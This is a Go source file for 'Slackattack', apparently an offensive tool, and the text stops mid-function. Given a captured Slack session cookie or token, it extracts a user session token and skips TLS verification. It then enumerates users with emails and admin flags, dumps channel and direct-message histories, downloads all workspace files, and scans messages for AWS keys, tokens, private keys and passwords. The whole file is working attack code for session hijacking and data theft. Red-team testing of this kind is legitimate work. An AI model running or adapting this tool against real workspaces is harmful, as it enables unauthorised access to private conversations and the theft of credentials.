package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
	"github.com/google/uuid"
)

const version = "1.0.0"

func printBanner(silence bool) {
	if !silence {
		banner := getBanner()
		fmt.Println(banner)
	}
}

func getBanner() string {
	return fmt.Sprintf(`
  █████████  ████                    █████           █████████   █████   █████                     █████
 ███░░░░░███░░███                   ░░███           ███░░░░░███ ░░███   ░░███                     ░░███
░███    ░░░  ░███   ██████    ██████ ░███ █████    ░███    ░███ ███████ ███████   ██████    ██████ ░███ █████
░░█████████  ░███  ░░░░░███  ███░░███░███░░███     ░███████████░░░███░ ░░░███░   ░░░░░███  ███░░███░███░░███
 ░░░░░░░░███ ░███   ███████ ░███ ░░░ ░██████░      ░███░░░░░███  ░███    ░███     ███████ ░███ ░░░ ░██████░
 ███    ░███ ░███  ███░░███ ░███  ███░███░░███     ░███    ░███  ░███ ███░███ ██████░░███ ░███  ███░███░░███
░░█████████  █████░░████████░░██████ ████ █████    █████   █████ ░░█████ ░░█████░░████████░░██████ ████ █████
 ░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░ ░░░░ ░░░░░    ░░░░░   ░░░░░   ░░░░░   ░░░░░  ░░░░░░░░  ░░░░░░ ░░░░ ░░░░░

Slackattack v%s
By: Jonathan Stines - @fr4nk3nst1ner
`, version)
}

func makeCookieRequest(workspaceURL, cookie string, proxyURL string) (string, error) {
	// Clean the cookie if it starts with 'd='
	cookie = strings.TrimPrefix(cookie, "d=")

	// Ensure workspaceURL is properly formatted
	if !strings.HasPrefix(workspaceURL, "https://") && !strings.HasPrefix(workspaceURL, "http://") {
		workspaceURL = "https://" + workspaceURL
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	if proxyURL != "" {
			proxyURLParsed, err := url.Parse(proxyURL)
			if err != nil {
				return "", fmt.Errorf("failed to parse proxy URL: %v", err)
			}
			transport.Proxy = http.ProxyURL(proxyURLParsed)
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	// Make request to main workspace URL
	req, err := http.NewRequest("GET", workspaceURL, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}

	// Set cookie exactly like Python
	req.AddCookie(&http.Cookie{
		Name:  "d",
		Value: cookie,
	})

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %v", err)
	}

	// Extract token using same regex as Python
	tokenRegex := regexp.MustCompile(`(xox[a-zA-Z]-[a-zA-Z0-9-]+)`)
	matches := tokenRegex.FindStringSubmatch(string(body))
	if len(matches) > 0 {
		return matches[0], nil
	}

	return "", fmt.Errorf("user session token not found in response")
}

func checkPermissions(token, cookie, workspaceURL, proxyURL string) error {
	// Set up credentials map like Python
	credentials := make(map[string]string)
	if token != "" {
		credentials["token"] = token
	} else if cookie != "" {
		credentials["cookie"] = cookie
		credentials["workspace_url"] = workspaceURL
	}

	// Test endpoints
	endpoints := []struct {
		name string
		url  string
	}{
		{"files.list", "https://slack.com/api/files.list"},
		{"users.list", "https://slack.com/api/users.list"},
		{"conversations.list", "https://slack.com/api/conversations.list"},
	}

	fmt.Println("Checking permissions...")
	for _, endpoint := range endpoints {
		// Use makeSlackRequest like Python does
		result, err := makeSlackRequest(endpoint.url, credentials, "POST", "", proxyURL, false)
		if err != nil {
			fmt.Printf("%s: false (Error: %v)\n", endpoint.name, err)
			continue
		}

		ok, _ := result["ok"].(bool)
		fmt.Printf("%s: %v\n", endpoint.name, ok)
	}

	return nil
}

func makeSlackRequest(urlStr string, credentials map[string]string, method string, payload string, proxyURL string, verifySSL bool) (map[string]interface{}, error) {
	maxRetries := 3
	retryDelay := time.Second * 2 // Start with 2 second delay

	var resp *http.Response
	var data map[string]interface{}
	var err error

	for attempt := 0; attempt < maxRetries; attempt++ {
		if attempt > 0 {
			time.Sleep(retryDelay)
			retryDelay *= 2 // Exponential backoff
		}

		headers := make(http.Header)

		// Use token-based authentication if available
		if token, ok := credentials["token"]; ok {
			headers.Set("Authorization", "Bearer "+token)
		} else if cookie, ok := credentials["cookie"]; ok {
			// Use cookie-based authentication if token is not provided
			userSessionToken, err := makeCookieRequest(credentials["workspace_url"], cookie, proxyURL)
			if err != nil {
				return nil, fmt.Errorf("unable to obtain user session token: %v", err)
			}

			// Generate boundary exactly like Python
			boundary := "----WebKitFormBoundary" + strings.ReplaceAll(uuid.New().String(), "-", "")

			// Set headers exactly like Python requests
			headers.Set("User-Agent", "python-requests/2.32.3")
			headers.Set("Accept-Encoding", "gzip, deflate, br")
			headers.Set("Accept", "*/*")
			headers.Set("Content-Type", fmt.Sprintf("multipart/form-data; boundary=%s", boundary))
			headers.Set("Origin", "https://api.slack.com")
			headers.Set("Cookie", "d="+cookie)
			headers.Set("Host", "slack.com")
			headers.Set("Connection", "keep-alive")

			// For files.list endpoint, add specific parameters
			if strings.Contains(urlStr, "files.list") {
				// Add query parameters to match Python version
				if !strings.Contains(urlStr, "?") {
					urlStr += "?"
				} else {
					urlStr += "&"
				}
				urlStr += "ts_from=0&ts_to=now&types=all&count=1000"
			}

			// Create form data payload exactly like Python
			payload = fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n%s\r\n--%s--\r\n",
				boundary, userSessionToken, boundary)
		}

		transport := &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: !verifySSL,
			},
		}

		if proxyURL != "" {
			proxyURLParsed, err := url.Parse(proxyURL)
			if err != nil {
				return nil, fmt.Errorf("failed to parse proxy URL: %v", err)
			}
			transport.Proxy = http.ProxyURL(proxyURLParsed)
		}

		client := &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}

		var req *http.Request
		if method == "POST" {
			if strings.Contains(urlStr, "conversations.open") {
				// For conversations.open, use form-urlencoded with proper headers
				formData := url.Values{}
				formData.Add("users", payload)
				
				req, err = http.NewRequest("POST", urlStr, strings.NewReader(formData.Encode()))
				if err != nil {
					return nil, fmt.Errorf("failed to create request: %v", err)
				}
				
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				
				// Set authentication
				if token, ok := credentials["token"]; ok {
					req.Header.Set("Authorization", "Bearer "+token)
				} else if cookie, ok := credentials["cookie"]; ok {
					userSessionToken, err := makeCookieRequest(credentials["workspace_url"], cookie, proxyURL)
					if err != nil {
						return nil, fmt.Errorf("unable to obtain user session token: %v", err)
					}
					req.Header.Set("Authorization", "Bearer "+userSessionToken)
					req.Header.Set("Cookie", "d="+cookie)
				}
			} else {
				// For other endpoints, use existing logic
				req, err = http.NewRequest("POST", urlStr, strings.NewReader(payload))
			}
		} else {
			req, err = http.NewRequest("GET", urlStr, nil)
		}

		if err != nil {
			return nil, fmt.Errorf("failed to create request: %v", err)
		}

		// Add all headers
		for key, values := range headers {
			for _, value := range values {
				req.Header.Add(key, value)
			}
		}

		resp, err = client.Do(req)
		if err != nil {
			continue // Try again on request error
		}
		defer resp.Body.Close()

		if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
			continue // Try again on decode error
		}

		// Check for rate limiting
		if errMsg, ok := data["error"].(string); ok && errMsg == "ratelimited" {
			if attempt < maxRetries-1 {
				continue // Try again if we have retries left
			}
		}

		// If we got here, either request succeeded or we're out of retries
		break
	}

	if err != nil {
		return nil, fmt.Errorf("failed after %d retries: %v", maxRetries, err)
	}

	if data["ok"] != true {
		if errMsg, ok := data["error"].(string); ok {
			return nil, fmt.Errorf("request failed: %s", errMsg)
		}
		return nil, fmt.Errorf("request failed with unknown error")
	}

	return data, nil
}

func listFiles(credentials map[string]string, proxyURL string, outputJSON string) error {
	result, err := makeSlackRequest(
		"https://slack.com/api/files.list",
		credentials,
		"POST",
		"",
		proxyURL,
		false,
	)
	if err != nil {
		return fmt.Errorf("failed to list files: %v", err)
	}

	files, ok := result["files"].([]interface{})
	if !ok {
		return fmt.Errorf("no files found in response")
	}

	if outputJSON != "" {
		// Save to JSON file if requested
		outputData := map[string]interface{}{
			"files": files,
		}
		jsonData, err := json.MarshalIndent(outputData, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal JSON: %v", err)
		}
		if err := os.WriteFile(outputJSON, jsonData, 0644); err != nil {
			return fmt.Errorf("failed to write JSON file: %v", err)
		}
	} else {
		// Print to stdout
		fmt.Println("\nList of All File URLs:")
		for _, file := range files {
			fileMap, ok := file.(map[string]interface{})
			if !ok {
				continue
			}
			if urlPermalink, ok := fileMap["url_private"].(string); ok {
				fmt.Println(urlPermalink)
			}
		}
	}

	return nil
}

func listChannels(credentials map[string]string, proxyURL string) ([]map[string]interface{}, error) {
	result, err := makeSlackRequest(
		"https://slack.com/api/conversations.list",
		credentials,
		"POST",
		"",
		proxyURL,
		false,
	)
	if err != nil {
		return nil, fmt.Errorf("failed to list channels: %v", err)
	}

	channels, ok := result["channels"].([]interface{})
	if !ok {
		return nil, fmt.Errorf("no channels found in response")
	}

	var channelList []map[string]interface{}
	for _, channel := range channels {
		if channelMap, ok := channel.(map[string]interface{}); ok {
			channelList = append(channelList, channelMap)
		}
	}

	return channelList, nil
}

func downloadFiles(credentials map[string]string, proxyURL string, outputDir string) error {
	// Create output directory if it doesn't exist
	if outputDir == "" {
		outputDir = "downloaded_files"
	}
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %v", err)
	}

	// Get files list using the same method as listFiles
	result, err := makeSlackRequest(
		"https://slack.com/api/files.list",
		credentials,
		"POST",
		"",
		proxyURL,
		false,
	)
	if err != nil {
		return fmt.Errorf("failed to list files: %v", err)
	}

	files, ok := result["files"].([]interface{})
	if !ok {
		return fmt.Errorf("no files found in response")
	}

	// Download each file
	for _, file := range files {
		fileMap, ok := file.(map[string]interface{})
		if !ok {
			continue
		}

		urlPrivate, ok := fileMap["url_private"].(string)
		if !ok {
			continue
		}

		filename, ok := fileMap["name"].(string)
		if !ok {
			continue
		}

		// Create request for file download
		req, err := http.NewRequest("GET", urlPrivate, nil)
		if err != nil {
			fmt.Printf("Error creating request for file %s: %v\n", filename, err)
			continue
		}

		// Set up headers exactly like makeSlackRequest
		if token, ok := credentials["token"]; ok {
			req.Header.Set("Authorization", "Bearer "+token)
		} else if cookie, ok := credentials["cookie"]; ok {
			userSessionToken, err := makeCookieRequest(credentials["workspace_url"], cookie, proxyURL)
			if err != nil {
				fmt.Printf("Error getting token for file %s: %v\n", filename, err)
				continue
			}
			req.Header.Set("User-Agent", "python-requests/2.32.3")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Cookie", "d="+cookie)
			req.Header.Set("Authorization", "Bearer "+userSessionToken)
		}

		// Set up client with proxy if needed
		transport := &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		}

		if proxyURL != "" {
			proxyURLParsed, err := url.Parse(proxyURL)
			if err != nil {
				fmt.Printf("Error parsing proxy URL for file %s: %v\n", filename, err)
				continue
			}
			transport.Proxy = http.ProxyURL(proxyURLParsed)
		}

		client := &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Error downloading file %s: %v\n", filename, err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			fmt.Printf("Error downloading file %s: status code %d\n", filename, resp.StatusCode)
			continue
		}

		// Save the file
		filepath := fmt.Sprintf("%s/%s", outputDir, filename)
		out, err := os.Create(filepath)
		if err != nil {
			fmt.Printf("Error creating file %s: %v\n", filepath, err)
			continue
		}
		defer out.Close()

		_, err = io.Copy(out, resp.Body)
		if err != nil {
			fmt.Printf("Error saving file %s: %v\n", filepath, err)
			continue
		}

		fmt.Printf("Downloaded: %s\n", filepath)
	}

	return nil
}

func scanForSecrets(content string) []map[string]string {
	var results []map[string]string

	// Create custom regex detectors for common patterns
	regexDetectors := map[string]*regexp.Regexp{
		"AWS Key":         regexp.MustCompile(`(?i)AKIA[0-9A-Z]{16}`),
		"AWS Secret":      regexp.MustCompile(`(?i)[0-9a-zA-Z/+]{40}`),
		"Private Key":     regexp.MustCompile(`(?i)-----BEGIN (?:RSA |OPENSSH )?PRIVATE KEY( BLOCK)?-----`),
		"GitHub Token":    regexp.MustCompile(`(?i)github[_\-\.]?token[^\S\r\n]*[:=][^\S\r\n]*['\"]?([^'\"]+)['\"]?`),
		"Slack Token":     regexp.MustCompile(`(?i)xox[pbar]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{32}`),
		"Google API Key":  regexp.MustCompile(`(?i)AIza[0-9A-Za-z\-_]{35}`),
		"Password Field":  regexp.MustCompile(`(?i)password[^\S\r\n]*[:=][^\S\r\n]*['\"]?([^'\"]+)['\"]?`),
		"API Key":        regexp.MustCompile(`(?i)api[_\-\.]?key[^\S\r\n]*[:=][^\S\r\n]*['\"]?([^'\"]+)['\"]?`),
		"Secret Key":     regexp.MustCompile(`(?i)secret[_\-\.]?key[^\S\r\n]*[:=][^\S\r\n]*['\"]?([^'\"]+)['\"]?`),
		"Access Token":   regexp.MustCompile(`(?i)access[_\-\.]?token[^\S\r\n]*[:=][^\S\r\n]*['\"]?([^'\"]+)['\"]?`),
		"Bearer Token":   regexp.MustCompile(`(?i)bearer[^\S\r\n]*[:=][^\S\r\n]*['\"]?([^'\"]+)['\"]?`),
	}

	// Scan content with regex detectors
	for detectorName, regex := range regexDetectors {
		matches := regex.FindAllString(content, -1)
		for _, match := range matches {
			results = append(results, map[string]string{
				"type":   detectorName,
				"secret": match,
			})
		}
	}

	return results
}

type Finding struct {
	RuleTriggered    string `json:"rule_triggered"`
	ChannelName      string `json:"channel_name"`
	ChannelID        string `json:"channel_id"`
	Timestamp        string `json:"timestamp"`
	SenderInfo       string `json:"sender_info"`
	MatchedWord      string `json:"matched_word"`
	MessageContents  string `json:"message_contents"`
}

func pillageWorkspace(credentials map[string]string, proxyURL string, targetChannel string, outputJSON string) error {
	// First get all channels
	channels, err := listChannels(credentials, proxyURL)
	if err != nil {
		return fmt.Errorf("failed to list channels: %v", err)
	}

	var channelsToScan []map[string]interface{}
	if targetChannel == "all" {
		channelsToScan = channels
	} else {
		// Find specific channel
		for _, channel := range channels {
			if name, ok := channel["name"].(string); ok && name == targetChannel {
				channelsToScan = append(channelsToScan, channel)
				break
			}
		}
		if len(channelsToScan) == 0 {
			return fmt.Errorf("channel '%s' not found", targetChannel)
		}
	}

	var findings []Finding

	// For each channel, get messages and scan them
	for _, channel := range channelsToScan {
		channelID, ok := channel["id"].(string)
		if !ok {
			continue
		}
		channelName, _ := channel["name"].(string)

		fmt.Printf("Scanning channel: %s\n", channelName)

		// Get channel history with pagination
		cursor := ""
		for {
			historyURL := fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&limit=1000", channelID)
			if cursor != "" {
				historyURL += "&cursor=" + cursor
			}

			result, err := makeSlackRequest(
				historyURL,
				credentials,
				"POST",
				"",
				proxyURL,
				false,
			)
			if err != nil {
				fmt.Printf("Error getting history for channel %s: %v\n", channelName, err)
				break
			}

			messages, ok := result["messages"].([]interface{})
			if !ok {
				break
			}

			// Scan each message
			for _, msg := range messages {
				msgMap, ok := msg.(map[string]interface{})
				if !ok {
					continue
				}

				text, ok := msgMap["text"].(string)
				if !ok {
					continue
				}

				// Get timestamp
				timestamp := "N/A"
				if ts, ok := msgMap["ts"].(string); ok {
					if tsFloat, err := strconv.ParseFloat(ts, 64); err == nil {
						timestamp = time.Unix(int64(tsFloat), 0).Format("2006-01-02 15:04:05")
					}
				}

				// Get sender info
				senderInfo := "Username: N/A"
				if userID, ok := msgMap["user"].(string); ok {
					// Get user details
					userResult, err := makeSlackRequest(
						"https://slack.com/api/users.info?user="+userID,
						credentials,
						"GET",
						"",
						proxyURL,
						false,
					)
					if err == nil {
						if user, ok := userResult["user"].(map[string]interface{}); ok {
							username, _ := user["name"].(string)
							senderInfo = fmt.Sprintf("User ID: %s, Username: %s", userID, username)
						}
					}
				}

				// Check for different patterns
				patterns := map[string]string{
					"AWS_KEYS":      `AKIA[0-9A-Z]{16}`,
					"GITHUB_TOKEN":  `ghp_[a-zA-Z0-9]{36}`,
					"SLACK_TOKEN":   `xox[pbar]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{32}`,
					"PRIVATE_KEY":   `-----BEGIN (?:RSA )?PRIVATE KEY-----`,
					"API_KEY":       `(?i)api[_-]?key.*=.*`,
					"SECRET_KEY":    `(?i)secret[_-]?key.*=.*`,
				}

				for ruleName, pattern := range patterns {
					re := regexp.MustCompile(pattern)
					matches := re.FindAllString(text, -1)
					
					for _, match := range matches {
						finding := Finding{
							RuleTriggered:   ruleName,
							ChannelName:     channelName,
							ChannelID:       channelID,
							Timestamp:       timestamp,
							SenderInfo:      senderInfo,
							MatchedWord:     match,
							MessageContents: text,
						}
						findings = append(findings, finding)
					}
				}
			}

			// Pagination handling
			hasMore, _ := result["has_more"].(bool)
			if !hasMore {
				break
			}

			metadata, ok := result["response_metadata"].(map[string]interface{})
			if !ok {
				break
			}

			nextCursor, ok := metadata["next_cursor"].(string)
			if !ok || nextCursor == "" {
				break
			}

			cursor = nextCursor
		}
	}

	// Output results
	if len(findings) == 0 {
		fmt.Println("\nNo secrets found.")
		return nil
	}

	if outputJSON != "" {
		jsonData, err := json.MarshalIndent(findings, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal JSON: %v", err)
		}
		if err := os.WriteFile(outputJSON, jsonData, 0644); err != nil {
			return fmt.Errorf("failed to write JSON file: %v", err)
		}
	} else {
		fmt.Println("\nFindings:")
		for _, finding := range findings {
			fmt.Printf("\nRule Triggered: %s\n", finding.RuleTriggered)
			fmt.Printf("Channel Name: %s\n", finding.ChannelName)
			fmt.Printf("Channel ID: %s\n", finding.ChannelID)
			fmt.Printf("Timestamp: %s\n", finding.Timestamp)
			fmt.Printf("Sender Info: %s\n", finding.SenderInfo)
			fmt.Printf("Matched Word: %s\n", finding.MatchedWord)
			fmt.Printf("Message Contents:\n%s\n", finding.MessageContents)
			fmt.Println(strings.Repeat("-", 80))
		}
	}

	return nil
}

func listUsersFunc(credentials map[string]string, proxyURL string, outputJSON string) error {
	result, err := makeSlackRequest(
		"https://slack.com/api/users.list",
		credentials,
		"POST",
		"",
		proxyURL,
		false,
	)
	if err != nil {
		return fmt.Errorf("failed to list users: %v", err)
	}

	users, ok := result["members"].([]interface{})
	if !ok {
		return fmt.Errorf("no users found in response")
	}

	var formattedUsers []map[string]string
	for _, user := range users {
		userMap, ok := user.(map[string]interface{})
		if !ok {
			continue
		}

		profile, _ := userMap["profile"].(map[string]interface{})
		
		// Convert boolean values to "Yes"/"No" strings
		isAdmin := "No"
		if admin, ok := userMap["is_admin"].(bool); ok && admin {
			isAdmin = "Yes"
		}
		isOwner := "No"
		if owner, ok := userMap["is_owner"].(bool); ok && owner {
			isOwner = "Yes"
		}
		isPrimaryOwner := "No"
		if primaryOwner, ok := userMap["is_primary_owner"].(bool); ok && primaryOwner {
			isPrimaryOwner = "Yes"
		}

		formattedUser := map[string]string{
			"User ID":          fmt.Sprintf("%v", userMap["id"]),
			"Username":         fmt.Sprintf("%v", userMap["name"]),
			"Real Name":        fmt.Sprintf("%v", userMap["real_name"]),
			"Display Name":     fmt.Sprintf("%v", profile["display_name"]),
			"Email":           fmt.Sprintf("%v", profile["email"]),
			"Is Admin":         isAdmin,
			"Is Owner":         isOwner,
			"Is Primary Owner": isPrimaryOwner,
		}
		formattedUsers = append(formattedUsers, formattedUser)
	}

	if outputJSON != "" {
		// Save to JSON file
		jsonData, err := json.MarshalIndent(formattedUsers, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal JSON: %v", err)
		}
		if err := os.WriteFile(outputJSON, jsonData, 0644); err != nil {
			return fmt.Errorf("failed to write JSON file: %v", err)
		}
	} else {
		// Print to stdout
		fmt.Println("\nList of Users:")
		for _, user := range formattedUsers {
			fmt.Printf("\nUser Details:\n")
			fmt.Printf("  User ID: %s\n", user["User ID"])
			fmt.Printf("  Username: %s\n", user["Username"])
			fmt.Printf("  Real Name: %s\n", user["Real Name"])
			fmt.Printf("  Display Name: %s\n", user["Display Name"])
			fmt.Printf("  Email: %s\n", user["Email"])
			fmt.Printf("  Is Admin: %s\n", user["Is Admin"])
			fmt.Printf("  Is Owner: %s\n", user["Is Owner"])
			fmt.Printf("  Is Primary Owner: %s\n", user["Is Primary Owner"])
		}
	}

	return nil
}

func listChannelsFunc(credentials map[string]string, proxyURL string, outputJSON string) error {
	channels, err := listChannels(credentials, proxyURL)
	if err != nil {
		return err
	}

	var formattedChannels []map[string]string
	for _, channel := range channels {
		// Get topic value or "N/A"
		topicValue := "N/A"
		if topic, ok := channel["topic"].(map[string]interface{}); ok {
			if value, ok := topic["value"].(string); ok && value != "" {
				topicValue = value
			}
		}

		// Format timestamp
		var lastUpdated string
		if ts, ok := channel["created"].(float64); ok {
			lastUpdated = time.Unix(int64(ts), 0).Format("2006-01-02 15:04:05")
		} else {
			lastUpdated = "N/A"
		}

		// Check if token user is member
		isMember := "No"
		if member, ok := channel["is_member"].(bool); ok && member {
			isMember = "Yes"
		}

		formattedChannel := map[string]string{
			"Name":                   fmt.Sprintf("%v", channel["name"]),
			"ID":                     fmt.Sprintf("%v", channel["id"]),
			"Value":                  topicValue,
			"Last Updated":           lastUpdated,
			"Context Team ID":        fmt.Sprintf("%v", channel["context_team_id"]),
			"Creator":                fmt.Sprintf("%v", channel["creator"]),
			"Is Supplied Token Member": isMember,
		}
		formattedChannels = append(formattedChannels, formattedChannel)
	}

	if outputJSON != "" {
		// Save to JSON file
		jsonData, err := json.MarshalIndent(formattedChannels, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal JSON: %v", err)
		}
		if err := os.WriteFile(outputJSON, jsonData, 0644); err != nil {
			return fmt.Errorf("failed to write JSON file: %v", err)
		}
	} else {
		// Print to stdout
		fmt.Println("\nList of Channels:")
		for _, channel := range formattedChannels {
			fmt.Printf("\nChannel Details:\n")
			fmt.Printf("  Name: %s\n", channel["Name"])
			fmt.Printf("  ID: %s\n", channel["ID"])
			fmt.Printf("  Value: %s\n", channel["Value"])
			fmt.Printf("  Last Updated: %s\n", channel["Last Updated"])
			fmt.Printf("  Context Team ID: %s\n", channel["Context Team ID"])
			fmt.Printf("  Creator: %s\n", channel["Creator"])
			fmt.Printf("  Is Supplied Token Member: %s\n", channel["Is Supplied Token Member"])
		}
	}

	return nil
}

func dumpMessages(credentials map[string]string, proxyURL string, targetName string, outputJSON string) error {
	var conversationID string

	// First try to find channel ID
	channels, err := listChannels(credentials, proxyURL)
	if err != nil {
		return fmt.Errorf("failed to list channels: %v", err)
	}

	// Look for channel match
	for _, channel := range channels {
		if name, ok := channel["name"].(string); ok && name == targetName {
			conversationID = channel["id"].(string)
			break
		}
	}

	// If not found in channels, try as DM
	if conversationID == "" {
		var userID string

		// Check if targetName is already a userID (starts with U)
		if strings.HasPrefix(targetName, "U") {
			userID = targetName
		} else {
			// Get users list to find userID from username
			result, err := makeSlackRequest(
				"https://slack.com/api/users.list",
				credentials,
				"POST",
				"",
				proxyURL,
				false,
			)
			if err != nil {
				return fmt.Errorf("failed to list users: %v (this might be due to rate limiting, try again in a few seconds)", err)
			}

			users, ok := result["members"].([]interface{})
			if !ok {
				return fmt.Errorf("no users found in response (this might be due to rate limiting, try again in a few seconds)")
			}

			// Look for user match
			for _, user := range users {
				userMap, ok := user.(map[string]interface{})
				if !ok {
					continue
				}
				if name, ok := userMap["name"].(string); ok && name == targetName {
					userID = userMap["id"].(string)
					break
				}
			}
		}

		if userID != "" {
			// Open DM channel using makeSlackRequest
			result, err := makeSlackRequest(
				"https://slack.com/api/conversations.open",
				credentials,
				"POST",
				userID,
				proxyURL,
				false,
			)
			if err != nil {
				return fmt.Errorf("failed to open DM: %v", err)
			}

			// Get channel ID from response
			if channel, ok := result["channel"].(map[string]interface{}); ok {
				conversationID = channel["id"].(string)
			}
		}
	}

	if conversationID == "" {
		return fmt.Errorf("'%s' not found as channel, username, or userID", targetName)
	}

	// Rest of the function remains the same, just use conversationID
	var allMessages []map[string]interface{}
	cursor := ""
	for {
		// Build URL with pagination and limits
		historyURL := fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&limit=1000", conversationID)
		if cursor != "" {
			historyURL += "&cursor=" + cursor
		}

		result, err := makeSlackRequest(
			historyURL,
			credentials,
			"POST",
			"",
			proxyURL,
			false,
		)
		if err != nil {
			return fmt.Errorf("failed to get messages: %v", err)
		}

		messages, ok := result["messages"].([]interface{})
		if !ok {
			break
		}

		// Format each message
		for _, msg := range messages {
			msgMap, ok := msg.(map[string]interface{})
			if !ok {
				continue
			}

			// Convert timestamp to readable format
			if ts, ok := msgMap["ts"].(string); ok {
				if tsFloat, err := strconv.ParseFloat(ts, 64); err == nil {
					msgMap["timestamp"] = time.Unix(int64(tsFloat), 0).Format("2006-01-02 15:04:05")
				}
			}

			allMessages = append(allMessages, msgMap)
		}

		// Check for more messages
		hasMore, _ := result["has_more"].(bool)
		if !hasMore {
			break
		}

		metadata, ok := result["response_metadata"].(map[string]interface{})
		if !ok {
			break
		}

		nextCursor, ok := metadata["next_cursor"].(string)
		if !ok || nextCursor == "" {
			break
		}

		cursor = nextCursor
	}

	if outputJSON != "" {
		// Save to JSON file
		jsonData, err := json.MarshalIndent(allMessages, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal JSON: %v", err)
		}
		if err := os.WriteFile(outputJSON, jsonData, 0644); err != nil {
			return fmt.Errorf("failed to write JSON file: %v", err)
		}
	} else {
		// Print to stdout
		fmt.Printf("\nMessages from #%s:\n", targetName)
		for _, msg := range allMessages {
			fmt.Printf("\n[%s] ", msg["timestamp"])
			if user, ok := msg["user"].(string); ok {
				fmt.Printf("<%s> ", user)
			}
			if text, ok := msg["text"].(string); ok {
				fmt.Println(text)
			}

			// Print attachments if any
			if attachments, ok := msg["attachments"].([]interface{}); ok {
				for _, att := range attachments {
					if attMap, ok := att.(map[string]interface{}); ok {
						if text, ok := attMap["text"].(string); ok {
							fmt.Printf("Attachment: %s\n", text)
						}
					}
				}
			}

			// Print files if any
			if files, ok := msg["files"].([]interface{}); ok {
				for _, file := range files {
					if fileMap, ok := file.(map[string]interface{}); ok {
						if name, ok := fileMap["name"].(string); ok {
							if url, ok := fileMap["url_private"].(string); ok {
								fmt.Printf("File: %s (%s)\n", name, url)
							}
						}
					}
				}
			}
		}
	}

	return nil
}

func listDMChannels(credentials map[string]string, proxyURL string, outputJSON string) error {
	// Make request to userBoot endpoint to get DM channels
	result, err := makeSlackRequest(
		"https://slack.com/api/client.userBoot",
		credentials,
		"POST",
		"",
		proxyURL,
		false,
	)
	if err != nil {
		return fmt.Errorf("failed to get DM channels: %v", err)
	}

	// Extract DM channels from response
	var dmChannels []string
	if openChannels, ok := result["is_open"].([]interface{}); ok {
		for _, channelID := range openChannels {
			if dmID, ok := channelID.(string); ok {
				if strings.HasPrefix(dmID, "D") {
					dmChannels = append(dmChannels, dmID)
				}
			}
		}
	}

	if outputJSON != "" {
		jsonData, err := json.MarshalIndent(dmChannels, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal JSON: %v", err)
		}
		if err := os.WriteFile(outputJSON, jsonData, 0644); err != nil {
			return fmt.Errorf("failed to write JSON file: %v", err)
		}
	} else {
		fmt.Println("\nDM Channels:")
		for _, channelID := range dmChannels {
			fmt.Println(channelID)
		}
	}

	return nil
}

func dumpDMChannel(credentials map[string]string, proxyURL string, channelID string, outputJSON string) error {
	// Verify channel ID format
	if !strings.HasPrefix(channelID, "D") {
		return fmt.Errorf("invalid DM channel ID format (should start with 'D')")
	}

	// Get channel history
	var allMessages []map[string]interface{}
	cursor := ""
	for {
		historyURL := fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&limit=1000", channelID)
		if cursor != "" {
			historyURL += "&cursor=" + cursor
		}

		result, err := makeSlackRequest(
			historyURL,
			credentials,
			"POST",
			"",
			proxyURL,
			false,
		)
		if err != nil {
			return fmt.Errorf("failed to get messages: %v", err)
		}

		messages, ok := result["messages"].([]interface{})
		if !ok {
			break
		}

		for _, msg := range messages {
			if msgMap, ok := msg.(map[string]interface{}); ok {
				// Convert timestamp
				if ts, ok := msgMap["ts"].(string); ok {
					if tsFloat, err := strconv.ParseFloat(ts, 64); err == nil {
						msgMap["timestamp"] = time.Unix(int64(tsFloat), 0).Format("2006-01-02 15:04:05")
					}
				}
				allMessages = append(allMessages, msgMap)
			}
		}

		// Handle pagination
		hasMore, _ := result["has_more"].(bool)
		if !hasMore {
			break
		}

		if metadata, ok := result["response_metadata"].(map[string]interface{}); ok {
			if nextCursor, ok := metadata["next_cursor"].(string); ok && nextCursor != "" {
				cursor = nextCursor
			} else {
				break
			}
		} else {
			break
		}
	}

	if outputJSON != "" {
		jsonData, err := json.MarshalIndent(allMessages, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal JSON: %v", err)
		}
		if err := os.WriteFile(outputJSON, jsonData, 0644); err != nil {
			return fmt.Errorf("failed to write JSON file: %v", err)
		}
	} else {
		fmt.Printf("\nMessages from DM Channel %s:\n", channelID)
		for _, msg := range allMessages {
			fmt.Printf("\n[%s] ", msg["timestamp"])
			if user, ok := msg["user"].(string); ok {
				fmt.Printf("<%s> ", user)
			}
			if text, ok := msg["text"].(string); ok {
				fmt.Println(text)
